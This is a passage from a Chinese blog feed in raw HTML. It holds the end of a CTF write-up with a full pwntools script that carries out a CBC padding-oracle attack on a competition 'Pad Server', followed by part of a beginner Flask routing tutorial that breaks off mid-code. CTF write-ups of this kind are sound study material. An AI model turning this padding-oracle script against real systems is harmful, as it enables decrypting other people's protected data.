class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># 建立一个列表,用于爆破使用,爆破只选择对应对应索引与字母的异或值,从而减少爆破次数</span></span><br><span class="line"><span class="comment"># 高频次出现的字母放在前面减少爆破次数和时间</span></span><br><span class="line">latter = <span class="string">&#x27;enisratdhulcgmobwfkzvpjyxqSDMBNAFEKLGHTWRZIUPCJVOYXQ&#x27;</span> </span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> latter:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        x.append(i^(<span class="built_in">ord</span>(j)))</span><br><span class="line">        <span class="comment">#print(x)</span></span><br><span class="line">    a.append(x)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_bytes</span>(<span class="params">block</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(block))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(block)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(block)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">padding</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([padding] * padding)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_other_block</span>(<span class="params">pre_list,lat_list</span>):</span><br><span class="line">    <span class="keyword">global</span> text</span><br><span class="line">    block1 = my_bytes(pre_list)</span><br><span class="line">    block2 = my_bytes(lat_list)</span><br><span class="line">    text1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">1</span>]:</span><br><span class="line">        payload = block1[:<span class="number">15</span>]</span><br><span class="line">        payload += xor(block1[<span class="number">15</span>], i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        payload += block2</span><br><span class="line">        payload = payload.<span class="built_in">hex</span>().encode()  <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">        <span class="comment">#print(len(payload))</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="comment">#print(rec)</span></span><br><span class="line">        <span class="keyword">if</span> rec == <span class="string">&#x27;True&#x27;</span>:  <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">            <span class="comment">#print(&quot;find---&gt;&quot;, xor(i.to_bytes(1, &#x27;big&#x27;), 1))  # 爆破到明文</span></span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), <span class="number">1</span>).decode() + text  <span class="comment"># 这里应该需要修改为异或1</span></span><br><span class="line">            <span class="comment">#print(&quot;text---&gt;&quot;, text)</span></span><br><span class="line">            text1 = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), <span class="number">1</span>).decode() + text1</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>):</span><br><span class="line">        padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>]  <span class="comment"># 再计算j+1的pad</span></span><br><span class="line">        <span class="comment">#print(padd2)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span> - j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">        <span class="comment">#print(&quot;text1---&gt;&quot;, text1)</span></span><br><span class="line">        t = xor(block1[<span class="number">16</span> - j:], text1.encode())  <span class="comment"># 先计算C_i-1[j]^P_n[j], 相比于前面这里去掉了padd</span></span><br><span class="line">        t2 = xor(t, padd2)  <span class="comment"># 最终计算得到C_i-1[j]^P_n[j]^(L+1)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[j+<span class="number">1</span>]:</span><br><span class="line">            payload = block1[:<span class="number">15</span> - j]  <span class="comment"># C_i-1[15-L]前面的数据不要动</span></span><br><span class="line">            payload += xor(block1[<span class="number">15</span> - j], i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)) + t2  <span class="comment"># 组合成第C_i-1密文块</span></span><br><span class="line">            payload += block2  <span class="comment"># 加上尾块</span></span><br><span class="line">            payload = payload.<span class="built_in">hex</span>().encode()  <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">            <span class="comment">#print(len(payload))</span></span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>, payload)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">            rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            <span class="comment">#print(rec)</span></span><br><span class="line">            <span class="keyword">if</span> rec == <span class="string">&#x27;True&#x27;</span>:  <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">                <span class="comment">#print(&quot;find---&gt;&quot;, xor(i.to_bytes(1, &#x27;big&#x27;), j + 1))  # 爆破到明文</span></span><br><span class="line">                text = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), j + <span class="number">1</span>).decode() + text  <span class="comment"># 添加到text中</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>, text)</span><br><span class="line">                text1 = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), j + <span class="number">1</span>).decode() + text1</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;text--&gt;&#x27;</span>,text)</span><br><span class="line">    <span class="keyword">return</span> text1</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;grandforge-of-face-melting-tschunk.gpn23.ctf.kitctf.de&quot;</span>, <span class="string">&quot;443&quot;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Welcome to the Pad Server!\n&#x27;</span>)</span><br><span class="line">    c1 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c1 = &#x27;</span>,c1)</span><br><span class="line">    iv_c2 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(iv_c2)</span><br><span class="line">    iv = iv_c2[:<span class="number">32</span>]</span><br><span class="line">    c2 = iv_c2[<span class="number">32</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>,c2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;iv=&#x27;</span>,iv)</span><br><span class="line">    l = <span class="built_in">len</span>(c2)</span><br><span class="line">    ll = l//<span class="number">32</span></span><br><span class="line">    <span class="built_in">print</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(l//<span class="number">32</span>)</span><br><span class="line">    c_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ll):</span><br><span class="line">        c_list.append(c2[i*<span class="number">32</span>:i*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">    <span class="built_in">print</span>(c_list)</span><br><span class="line">    <span class="built_in">print</span>(my_bytes(c_list[-<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;block_length---&gt;&#x27;</span>,<span class="built_in">len</span>(c_list))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c_list)&lt;=<span class="number">40</span>: <span class="comment"># 选择块总数＜=40的消息进行爆破,从而减少时间</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># 确定padding长度</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    block1 = my_bytes(c_list[-<span class="number">2</span>])</span><br><span class="line">    block2 = my_bytes(c_list[-<span class="number">1</span>])</span><br><span class="line">    payload = (block1[:i]+xor(block1[i],<span class="string">b&#x27;\x10&#x27;</span>)+block1[i+<span class="number">1</span>:]+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">    rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="comment">#print(rec)</span></span><br><span class="line">    <span class="keyword">if</span> rec==<span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        padding=<span class="number">0x10</span>-i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#print(&quot;padding----&gt;&quot;,padding)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解尾块的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(padding,<span class="number">16</span>,<span class="number">1</span>):</span><br><span class="line">    padd = pad(padding) <span class="comment"># 先计算原始padd</span></span><br><span class="line">    padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>] <span class="comment"># 再计算j+1的pad</span></span><br><span class="line">    <span class="comment">#print(padd2)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span>-j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">    t = xor(block1[<span class="number">16</span>-j:],text.encode()+padd) <span class="comment"># 先计算C_i-1[j]^P_n[j]</span></span><br><span class="line">    t2 = xor(t,padd2) <span class="comment"># 最终计算得到C_i-1[j]^P_n[j]^(L+1)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a[j+<span class="number">1</span>]:</span><br><span class="line">        payload = block1[:<span class="number">15</span>-j]  <span class="comment"># C_i-1[15-L]前面的数据不要动</span></span><br><span class="line">        payload +=xor(block1[<span class="number">15</span>-j],i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))+t2 <span class="comment"># 组合成第C_i-1密文块</span></span><br><span class="line">        payload +=block2    <span class="comment">#加上尾块</span></span><br><span class="line">        payload = payload.<span class="built_in">hex</span>().encode() <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">        <span class="comment">#print(len(payload))</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="comment">#print(rec)</span></span><br><span class="line">        <span class="keyword">if</span> rec==<span class="string">&#x27;True&#x27;</span>: <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">            <span class="comment">#print(&quot;find---&gt;&quot;,xor(i.to_bytes(1,&#x27;big&#x27;),j+1)) # 爆破到明文</span></span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>).decode() + text <span class="comment"># 添加到text中</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>,text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(c_list)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>),leave=<span class="string">&#x27;true&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;block<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i&gt;=<span class="number">1</span>:</span><br><span class="line">        attack_other_block(c_list[i-<span class="number">1</span>],c_list[i])</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">0</span>:</span><br><span class="line">        attack_other_block(iv,c_list[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;text:&#x27;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;encrypt_flag:&#x27;</span>,c1)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：暑假复现了两题，感觉太少了没发（有碎碎念）</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>Python-flask框架开发</title>
    <link href="http://iyheart.github.io/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/"/>
    <id>http://iyheart.github.io/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/</id>
    <published>2025-09-02T00:47:37.000Z</published>
    <updated>2025-09-03T07:55:24.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask开发规范">flask开发规范</h1><h2 id="hello_world">Hello_world</h2><p>对于flask框架的开发，一般都是遵循着如下格式模版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902223748762.png" alt="image-20250902223748762"></p><h2 id="路由规范">路由规范</h2><ol><li>路由定义的路径名称应尽量与其绑定的函数名称应该<strong>尽量相同</strong></li></ol><h2 id="项目目录">项目目录</h2><ul><li>对于一个比较复杂的项目结构，该结构的目录如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">my_flask_app/</span><br><span class="line">│</span><br><span class="line">├── app/ </span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── routes/  <span class="comment"># 路由逻辑</span></span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   ├── main.py</span><br><span class="line">│   │   └── auth.py</span><br><span class="line">│   ├── models/    <span class="comment"># 数据库模型</span></span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   └── user.py</span><br><span class="line">│   ├── templates/<span class="comment"># 前端展示相关</span></span><br><span class="line">│   │   ├── layout.html</span><br><span class="line">│   │   └── home.html</span><br><span class="line">│   └── static/<span class="comment"># 前端展示相关</span></span><br><span class="line">│       ├── css/</span><br><span class="line">│       └── js/</span><br><span class="line">│</span><br><span class="line">├── config.py<span class="comment"># 配置</span></span><br><span class="line">├── requirements.txt<span class="comment"># 项目依赖</span></span><br><span class="line">├── migrations/<span class="comment"># 数据库版本管理</span></span><br><span class="line">│   └── ...</span><br><span class="line">└── run.py<span class="comment"># 程序启动文件</span></span><br></pre></td></tr></table></figure><h1 id="flask路由">flask路由</h1><ul><li>在flask中路由并不是指网络层的那些东西，而是web应用将<code>URL映射</code>到<code>python</code>函数的机制。flask路由是flask应用的核心部分，用于处理不同的<code>URL</code>的请求，并将请求的处理委托给相应的视图函数。</li><li>下面是关于Flask路由的详细说明：<ul><li>定义路由：<code>@app.route(&quot;/path&quot;)</code>装饰器定义URL和视图函数的映射。</li><li>路由参数：通过动态部分在<code>URL</code>中传递参数</li><li>路由规则：使用类型转换器指定URL参数传递的类型，字符串、整数、浮点数、路径。</li><li>请求方法：指定允许的HTTP请求方法。</li><li>路由函数返回：视图函数可以返回不同的类型响应。</li><li>静态文件和模版：管理静态文件和动态渲染HTML模版。</li><li>路由优先级：确保路由顺序正确，以避免意外匹配结果。</li></ul></li></ul><h2 id="定义路由">定义路由</h2><p>路由的定义其实就是如下两步：</p><ul><li>第一步先在一行中写上<code>@app.route(&quot;/path&quot;)</code>。</li><li>第二步紧接着定义一个函数，这个函数被称为<strong>视图函数</strong>，例子就用<code>hello_world</code>的这个例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><h2 id="参数接收">参数接收</h2><ul><li>在定义路由的时候定义这样的形式：<code>@app.route('/say/&lt;name&gt;')</code>，这就是表示将<code>URL</code>请求的一些路径参数传递给函数，这个<code>name</code>其实是一个变量名称。</li><li>当使用<code>URL</code>访问<code>/say/xxx</code>，此时<code>name=xxx</code>就会作为参数传递给其绑定的函数，所以路由绑定的函数就会存在<code>name</code>这个参数，而这个<code>xxx</code>是被用户决定的。</li><li>例子：对于如下代码，当我们访问<code>/say/aaa</code>，<code>name='aaa'</code>，此时就会返回<code>hello aaa</code>；如果访问<code>/say/bbb</code>，此时就会返回<code>hello bbb</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/say/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225006459.png" alt="image-20250902225006459"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225103185.png" alt="image-20250902225103185"></p><h2 id="路由规则">路由规则</h2><ul><li>对于参数的接收可以指定一个规则，使得接收的参数为整型会绑定一个函数，接收的参数为字符串类型会绑定另一个函数。这个规则的定义如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;int:number&gt;&quot;</span></span>) </span><span class="comment"># &lt;数据类型:变量名&gt;</span></span><br></pre></td></tr></table></figure><ul><li>例子如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;int:number&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">type1</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;int,<span class="subst">&#123;number&#125;</span>&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;string:strs&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">type2</span>(<span class="params">strs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;str,<span class="subst">&#123;strs&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225722918.png" alt="image-20250902225722918"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225735722.png" alt="image-20250902225735722"></p><h2 id="请求方法">请求方法</h2><ul><li><p>这里的请求方法指的是<code>http</code>协议的请求方法，常见的<code>http</code>协议的请求方法有：<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>。这里指简单介绍<code>GET</code>请求和<code>POST</code>请求。</p></li><li><p>定义的形式如下：选定传入的参数为<code>methods</code>，<code>methods</code>为一个列表类型，它需要指定为接收的方法类型，比如只处理get请求，就只写<code>['GET']</code>；如果需要处理get、post请求，就需要写<code>['GET','POST']</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br></pre></td></tr></table></figure><ul><li>例子如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 